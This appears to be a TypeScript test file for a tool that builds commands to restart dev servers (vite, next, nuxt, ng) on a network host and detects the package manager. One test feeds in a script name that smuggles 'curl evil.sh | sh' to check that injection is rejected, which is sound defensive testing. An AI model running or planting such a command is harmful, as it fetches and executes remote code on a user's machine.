import { test } from 'node:test';
import assert from 'node:assert';
import * as fs from 'node:fs/promises';
import * as os from 'node:os';
import * as path from 'node:path';
import { buildNetworkCommand, detectPackageManager } from '../src/restartCommand.ts';

const build = (scripts: Record<string, unknown>, processCommand: string, packageManager = 'npm') =>
  buildNetworkCommand({ scripts, processCommand, packageManager });

test('uses the preferred script that runs the same tool', () => {
  assert.strictEqual(
    build({ build: 'vite build', start: 'vite', dev: 'vite --port 3000' }, 'node /app/node_modules/.bin/vite --port 3000'),
    'npm run dev -- --host');
});

test('passes the flag straight through for other package managers', () => {
  assert.strictEqual(build({ dev: 'next dev' }, 'next-server (v14.2.0)', 'pnpm'), 'pnpm run dev -H 0.0.0.0');
});

test('recognises tools run from their package\'s bin file', () => {
  assert.strictEqual(build({ dev: 'nuxt dev' }, 'node /app/node_modules/nuxt/bin/nuxt.mjs dev'), 'npm run dev -- --host');
  assert.strictEqual(build({ dev: 'nuxi dev' }, 'node /app/node_modules/.bin/nuxi dev'), 'npm run dev -- --host');
  assert.strictEqual(build({ start: 'ng serve' }, 'ng serve'), 'npm run start -- --host 0.0.0.0');
});

test('never offers a script name that could inject shell commands', () => {
  assert.strictEqual(build({ 'dev; curl evil.sh | sh; #': 'vite' }, 'node /app/node_modules/.bin/vite'), undefined);
});

test('does not replace a server that is not one of the known tools', () => {
  // Laravel ships "dev": "vite" for its assets; restarting would swap the app for the asset server.
  assert.strictEqual(build({ dev: 'vite' }, 'php artisan serve'), undefined);
  assert.strictEqual(build({ dev: 'vite', start: 'node server.js' }, 'node server.js'), undefined);
  assert.strictEqual(build({ dev: 'vite' }, ''), undefined);
});

test('does not mistake a folder name for the tool', () => {
  assert.strictEqual(build({ dev: 'node server.js' }, 'node /Users/me/vite-app/server.js'), undefined);
  assert.strictEqual(build({ dev: 'vite' }, 'node /Users/me/vite/server.js'), undefined);
  assert.strictEqual(build({ dev: 'next dev' }, 'node /Users/me/vite/app/node_modules/.bin/next dev'), 'npm run dev -- -H 0.0.0.0');
});

test('skips scripts the flag would not reach, or that already set a host', () => {
  const vite = 'node /app/node_modules/.bin/vite';
  assert.strictEqual(build({ dev: 'vite && echo done' }, vite), undefined);
  assert.strictEqual(build({ dev: 'concurrently "vite" "node api.js"' }, vite), undefined);
  assert.strictEqual(build({ dev: 'vite --host localhost' }, vite), undefined);
  assert.strictEqual(build({ dev: 'vite --host localhost', serve: 'vite' }, vite), 'npm run serve -- --host');
});

test('detects the package manager from the monorepo root and the packageManager field', async () => {
  const root = await fs.mkdtemp(path.join(os.tmpdir(), 'mobile-serve-'));
  try {
    const app = path.join(root, 'packages', 'web');
    await fs.mkdir(app, { recursive: true });
    await fs.writeFile(path.join(root, 'pnpm-lock.yaml'), '');
    await fs.writeFile(path.join(app, 'package.json'), '{}');
    assert.strictEqual(await detectPackageManager(app), 'pnpm');
    await fs.writeFile(path.join(app, 'package.json'), '{"packageManager": "yarn@4.1.0"}');
    assert.strictEqual(await detectPackageManager(app), 'yarn');
  } finally {
    await fs.rm(root, { recursive: true, force: true });
  }
});
